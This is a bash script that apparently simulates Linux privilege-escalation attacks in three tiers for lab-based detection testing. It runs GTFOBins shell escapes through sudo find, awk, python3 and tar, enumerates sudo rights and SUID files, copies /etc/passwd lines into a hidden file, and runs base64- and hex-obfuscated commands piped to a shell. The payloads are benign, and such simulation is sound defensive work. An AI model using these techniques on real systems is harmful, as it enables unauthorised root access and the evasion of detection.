#!/usr/bin/env bash
# ==============================================================================
# SCRIPT: privesc_gtfobins_attacks.sh
# PURPOSE: Linux PrivEsc & GTFOBins Attack Simulation across Complexity Tiers
#
# [SAFETY NOTICE & WORKSPACE INVARIANT]:
# DO NOT EXECUTE DIRECTLY ON HOST MACHINES.
# THIS SCRIPT IS STRICTLY AN ARTIFACT INTENDED FOR EXPORT AND EXECUTION INSIDE
# AN ISOLATED, NON-NETWORKED LAB VIRTUAL MACHINE UNDER FULL RESEARCHER CONTROL.
#
# COMPLEXITY TIERS:
#   - Tier 1: Overt / Isolated single-command PrivEsc (sudo, SUID, GTFOBins)
#   - Tier 2: Multi-step Chained Sequences (recon -> privesc -> exfil/persistence)
#   - Tier 3: Obfuscated / Stealthy (hex escapes, base64 pipes, IFS substitution)
# ==============================================================================

set -uo pipefail

echo "======================================================================"
echo " [!] CAUTION: PRIVILEGE ESCALATION LAB ATTACK SIMULATOR"
echo " [!] Isolated Lab VM Target Only."
echo "======================================================================"

# ------------------------------------------------------------------------------
# TIER 1: OVERT / ISOLATED GTFOBINS ABUSE
# ------------------------------------------------------------------------------
echo "[*] Executing Tier 1: Overt GTFOBins Invocations..."

# T1.1 Sudo find GTFOBin
sudo find . -exec /bin/sh -c 'id; echo "[Tier1] find exec spawned"' \; -quit || true

# T1.2 Sudo awk GTFOBin
sudo awk 'BEGIN {system("id; echo \"[Tier1] awk shell spawned\"")}' || true

# T1.3 Sudo python3 GTFOBin
sudo python3 -c 'import os; os.system("id; echo \"[Tier1] python setuid/exec\"")' || true

# T1.4 Tar Wildcard / Checkpoint Action PrivEsc
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='id; echo "[Tier1] tar checkpoint exec"' || true

# T1.5 Ingress Tool Transfer via curl to /tmp
curl -s -o /tmp/simulated_priv_tool.sh http://127.0.0.1:8000/test || true

# ------------------------------------------------------------------------------
# TIER 2: CHAINED MULTI-STEP ATTACK SEQUENCES (Springer 2026 sliding window)
# ------------------------------------------------------------------------------
echo "[*] Executing Tier 2: Chained Attack Sequences..."

# Chain A: Sudo enumeration -> GTFOBin -> Sensitive file touch
whoami
id
sudo -l || true
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat /etc/passwd | head -n 5 > /tmp/.harvested' || true
cat /tmp/.harvested || true

# Chain B: SUID file search -> SUID execution -> Cron backdoor staging
find / -perm -4000 -type f 2>/dev/null | head -n 5 || true
echo "* * * * * root /bin/echo 'privesc-lab-beacon'" >> /tmp/simulated_crontab.txt || true
chmod 600 /tmp/simulated_crontab.txt || true

# ------------------------------------------------------------------------------
# TIER 3: OBFUSCATED & STEALTHY GTFOBINS (SLR 2026 Anomaly Degradation Test)
# ------------------------------------------------------------------------------
echo "[*] Executing Tier 3: Obfuscated GTFOBins Invocations..."

# T3.1 Hex-escaped bash command substitution
bash -c "$(printf '\x69\x64\x20\x3b\x20\x65\x63\x68\x6f\x20\x22\x5b\x54\x69\x65\x72\x33\x5d\x20\x48\x65\x78\x20\x45\x73\x63\x61\x70\x65\x64\x20\x53\x68\x65\x6c\x6c\x22')" || true

# T3.2 Base64-encoded pipe to shell
echo "aWQgOyBlY2hvICJbVGllcjNdIEJhc2U2NCBTaGVsbCBFeGVjIg==" | base64 -d | sh || true

# T3.3 Variable concatenation and IFS delimiter obfuscation
u="s"; v="u"; d="o";
$u$v$d python3 -c "import$IFS'sys';sys.stdout.write('[Tier3] GTFOBin Variable Concatenation\n')" || true

# T3.4 Obfuscated SUID GTFOBin with eval
find . -exec /bin/sh -c 'eval $(echo aWQgOyBlY2hvICJbVGllcjNdIFNVSUQgRXZhbCI= | base64 -d)' \; -quit || true

echo "[+] Tier 1, 2, and 3 attack simulations completed."
